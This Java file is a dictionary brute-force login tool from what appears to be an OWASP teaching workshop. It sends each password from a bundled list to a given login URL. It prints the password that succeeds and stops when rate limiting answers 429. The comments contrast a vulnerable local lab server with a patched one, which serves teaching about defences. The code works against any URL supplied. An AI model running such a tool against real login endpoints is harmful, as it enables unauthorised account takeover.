package taller.owasp.attacks;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

/**
 * M6 · Herramienta de ataque de diccionario (fuerza bruta) al login.
 *
 * Lee una lista de contrasenas (attacks/passwords.txt) y prueba una por una contra
 * POST /api/login hasta que alguna devuelve 200 (entro). Es la contraparte ofensiva de
 * las defensas de M6:
 *   - Contra el perfil vulnerable (3000): no hay limite, asi que recorre la lista
 *     entera y suele encontrar la contrasena.
 *   - Contra el perfil patched (3001): el RateLimitFilter responde 429 al 6.o intento
 *     por minuto y el ataque se detiene sin llegar lejos.
 *
 * No es un bean de Spring: es un programa suelto que se ejecuta con main(...).
 */
public class DictionaryAttack {

    private final HttpClient cliente = HttpClient.newHttpClient();

    /**
     * Carga el diccionario de contrasenas desde el recurso attacks/passwords.txt
     * (empaquetado en el classpath). Ignora las lineas en blanco y recorta espacios.
     * Lanza excepcion si el archivo no esta en el classpath.
     */
    public List<String> cargarContraseñas() throws Exception {

        List<String> contraseñas = new ArrayList<>();

        InputStream archivo = getClass()
                .getClassLoader()
                .getResourceAsStream("attacks/passwords.txt");

        if (archivo == null) {
            throw new Exception("No se encontró el archivo de contraseñas");
        }

        try (BufferedReader lector = new BufferedReader(
                new InputStreamReader(archivo, StandardCharsets.UTF_8))) {

            String linea;

            while ((linea = lector.readLine()) != null) {
                if (!linea.isBlank()) {
                    contraseñas.add(linea.trim());
                }
            }
        }

        return contraseñas;
    }

    // Comprobacion rapida de que el diccionario se cargo bien: imprime cuantas
    // contrasenas hay y una de muestra. Util para depurar, no forma parte del ataque.
    public void probarCarga() throws Exception {
        List<String> contraseñas = cargarContraseñas();

        System.out.println("Total de contraseñas cargadas: " + contraseñas.size());
        System.out.println("Contraseña en posición 37: " + contraseñas.get(36));
    }

    /**
     * Ejecuta el ataque: para el usuario dado, envia un POST JSON al login con cada
     * contrasena del diccionario e interpreta la respuesta HTTP:
     *   - 200 -> la contrasena es correcta: la imprime y termina.
     *   - 429 -> el rate limit (patched) corto el ataque: termina.
     *   - 401 -> contrasena incorrecta: sigue con la siguiente.
     *   - otro -> respuesta inesperada: termina para no seguir a ciegas.
     */
    public void ejecutarAtaque(String url, String usuario) throws Exception {

        List<String> contraseñas = cargarContraseñas();

        int intento = 0;

        for (String contraseña : contraseñas) {

            intento++;

            String json = """
                    {
                        "username": "%s",
                        "password": "%s"
                    }
                    """.formatted(usuario, contraseña);

            HttpRequest peticion = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json))
                    .build();

            HttpResponse<String> respuesta = cliente.send(
                    peticion,
                    HttpResponse.BodyHandlers.ofString()
            );

            if (respuesta.statusCode() == 200) {
                System.out.println("[✓] Contraseña encontrada: "
                        + contraseña + " (intento " + intento + ")");
                return;
            }

            if (respuesta.statusCode() == 429) {
                System.out.println("[✗] Bloqueado: 429 en el intento " + intento);
                return;
            }

            if (respuesta.statusCode() != 401) {
                System.out.println("[!] Respuesta inesperada: HTTP "
                        + respuesta.statusCode());
                return;
            }
        }

        System.out.println("[✗] No se encontró la contraseña.");
    }

    // Punto de entrada por linea de comandos.
    // Uso: DictionaryAttack <URL_LOGIN> <USUARIO>
    //   ej. http://localhost:3000/api/login admin  (vulnerable, sin limite)
    //       http://localhost:3001/api/login admin  (patched, corta en 429)
    public static void main(String[] args) throws Exception {

        if (args.length != 2) {
            System.out.println(
                    "Uso: DictionaryAttack <URL_LOGIN> <USUARIO>"
            );
            return;
        }

        DictionaryAttack ataque = new DictionaryAttack();
        ataque.ejecutarAtaque(args[0], args[1]);
    }
}